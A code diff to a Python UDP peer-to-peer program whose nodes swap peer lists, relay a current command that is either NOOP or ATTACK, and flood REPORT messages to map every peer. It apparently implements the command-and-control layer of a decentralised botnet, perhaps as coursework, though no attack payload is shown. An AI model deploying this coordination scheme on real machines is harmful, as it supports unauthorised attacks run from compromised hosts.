@@ -3,23 +3,31 @@ import time
 import threading
 import queue
 import sys
+import random
 
-s_print_lock = threading.Lock()
+METHOD_DISCOVER      = 'DSCVR'
+METHOD_PING          = 'PING'
+METHOD_INIT_REPORT   = 'INIT_REPORT'
+METHOD_REPORT        = 'REPORT'
 
-METHOD_DISCOVER = 'DSCVR'
-METHOD_PING     = 'PING'
+COMMAND_NOOP         = 'NOOP'
+COMMAND_ATTACK       = 'ATTACK'
 
-COMMAND_NOOP    = 'NOOP'
-COMMAND_ATTACK  = 'ATTACK'
 
 global_peer_list = []
+global_answered_reports = dict()
 
+s_print_lock = threading.Lock()
 def s_print(*a, **b):
     """Thread safe print function"""
-    #print('aaaa')
     with s_print_lock:
         print(*a, **b)
     sys.stdout.flush()
+
+def get_peerlist_as_string():
+    global global_peer_list
+    l = [host + ':' + str(port) for host, port in global_peer_list]
+    return ','.join(l)
 
 def send_message(sock, peer, msg_content='', method='', timeout=0):
     m = method + '|' if method != '' else ''
@@ -31,7 +39,6 @@ def listen_to_message(sock):
         b, addr = sock.recvfrom(2048)
         return b.decode('utf-8'), addr
     except Exception as e:
-        #print(e)
         return None, None
 
 def send_ping(peer):
@@ -68,10 +75,61 @@ def send_discover(peer, my_address):
         return True, last_command, ips.split(',')
 
 def answer_discover(sock, peer, last_command, peer_list):
-    p_list = ','.join(map(lambda a: f'{a[0]}:{a[1]}', peer_list))
-    payload = f'{last_command}|{p_list}'
+    payload = f'{last_command}|{get_peerlist_as_string()}'
     s_print('[LISTEN] Answering', peer, 'with', payload)
     send_message(sock, peer, payload)
+
+def send_init_report_listener(addr):
+    report_id = str(random.randint(10000, 99999))
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+        send_message(sock, addr, report_id, METHOD_INIT_REPORT)
+        response = listen_to_message(sock)
+        return response
+
+def answer_init_report_listener(callback_socket, callback_addr, my_address, report_id):
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+        sock.settimeout(5)
+        sock.bind((my_address[0], 9999))
+        for peer in global_peer_list:
+            s_print('[REPORT] initial repassing REPORT to ', peer)
+            send_message(sock,
+                         peer,
+                         my_address[0] + '|' + str(9999) + '|' + report_id,
+                         METHOD_REPORT)
+
+        received = []
+        try:
+            while True:
+                res, addr = listen_to_message(sock)
+                if addr is None:
+                    raise Exception()
+                received.append(res)
+        except Exception as e:
+            print(e)
+            send_message(callback_socket, callback_addr, ' '.join(received))
+
+def answer_report(report_to, report_id, my_address):
+    global global_peer_list
+    global global_answered_reports
+
+    now = time.time()
+    if report_id in global_answered_reports:
+        if now - global_answered_reports[report_id] < 120: # Registry newer than 120 seconds
+            print('returning')
+            return
+    global_answered_reports[report_id] = now
+
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+        # Return my peer list to the reporter
+        s_print('[REPORT] Sending peer list to', report_to)
+        send_message(sock, report_to, f'{my_address[0]}|{my_address[1]}|{get_peerlist_as_string()}')
+
+        for peer in global_peer_list:
+            s_print('[REPORT] repassing REPORT to ', peer)
+            send_message(sock,
+                         peer,
+                         report_to[0] + '|' + str(report_to[1]) + '|' + report_id,
+                         METHOD_REPORT)
 
 def listen_thread(my_address, write_queue):
     s_print('Started listen_thread', flush=True)
@@ -94,6 +152,13 @@ def listen_thread(my_address, write_queue):
                 host, port = args
                 answer_discover(udp_socket, addr, current_command, global_peer_list)
                 write_queue.put((host, int(port)))
+
+            if op == METHOD_INIT_REPORT:
+                answer_init_report_listener(udp_socket, addr, my_address, args[0])
+
+            if op == METHOD_REPORT:
+                host, port, report_id = args
+                answer_report((host, int(port)), report_id, my_address)
 
         except Exception as e:
             raise e
